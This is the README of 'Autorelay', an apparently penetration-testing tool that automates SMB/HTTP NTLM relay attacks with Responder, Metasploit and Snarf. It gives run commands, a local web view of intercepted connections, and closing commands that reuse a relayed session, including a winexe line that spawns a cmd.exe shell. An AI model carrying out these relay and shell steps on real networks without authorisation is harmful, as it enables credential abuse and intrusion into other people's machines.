# Autorelay

Automatically performs the SMB relay attack either locally or on a remote device. Uses Responder to poison, Metasploit for HTTP NTLM relay (rather than just SMB relay), and Snarf for the MITM'ing. When using locally, only requires an interface and an nmap XML file of the target network to determine SMB hosts. When used for SMB relaying on a jumpbox, requires the IP address of the jumpbox.


## Usage

* pip install -r requirements

######Remote

* python autoresp.py -d [remote server internal IP] -x [nmap xml output file from the remote network] -i [remote device interface]

######Local

* python autoresp.py -x [nmap xml output file from the remote network] -i [interface]

* Point your local browser to http://localhost:4001 and refresh it periodically to see your MITM'd connections

* After a connection is expired (or you expire it), click "choose"

* Run this command locally if relaying locally or run it on the jumpbox if you're relaying remotely: smbclient -U a%a //127.0.0.1

* Alternatively, if you gain admin rights through the SMB connection spawn a shell with: winexe //127.0.0.1 -U "a%a" cmd.exe

